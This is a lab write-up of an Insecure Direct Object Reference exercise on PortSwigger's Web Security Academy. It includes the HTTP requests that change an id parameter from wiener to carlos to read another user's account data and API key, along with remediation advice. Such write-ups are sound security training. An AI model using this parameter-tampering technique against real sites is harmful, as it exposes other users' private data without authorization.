# PS-004 — Insecure Direct Object Reference (IDOR / BOLA)

**Date / Analyst:** 2025-09-03 — Christopher Araque  
**Environment:** PortSwigger WSA — “User ID controlled by request parameter”

## TL;DR

- Object identifier is trusted without server-side authorization.
- Changing the identifier returns another user’s data (or permits modification).
- Fix: enforce object-level authorization on every request; avoid predictable IDs.

## Scope & Target

- **Endpoint/Param:** /my-account?id=<username>
- **Auth context:** logged in as wiener
- **Method:** GET

## Steps to Reproduce

1. Send baseline request for your own object and save response.
2. Modify the identifier (e.g., id=1→2 or user=wiener→carlos) and resend.
3. Observe unauthorized data/functionality.
   **Baseline (your object):**
   GET /my-account?id=wiener HTTP/2
   Host: <lab-host>.web-security-academy.net
   Cookie: session=<redacted>

**Modified (other user's object):**
GET /my-account?id=carlos HTTP/2
Host: <lab-host>.web-security-academy.net
Cookie: session=<redacted>

## Evidence

- Screenshot:
  [PS-004]! (../../evidence/ps-idor/ps-004-screenshot.png)
- Request:
  [PS-004-request.txt](../../evidence/ps%20idor/ps-004-request.rtf)

## Impact

Attacker can view another user’s private data and API key.

## Recommended Fix

Enforce server-side object-level authorization (BOLA), use indirect IDs, log + alert.

## ATT&CK / CWE

- MITRE ATT&CK: Exfiltration or Collection contexts depending on data accessed.
- CWE-639: Authorization Bypass Through User-Controlled Key
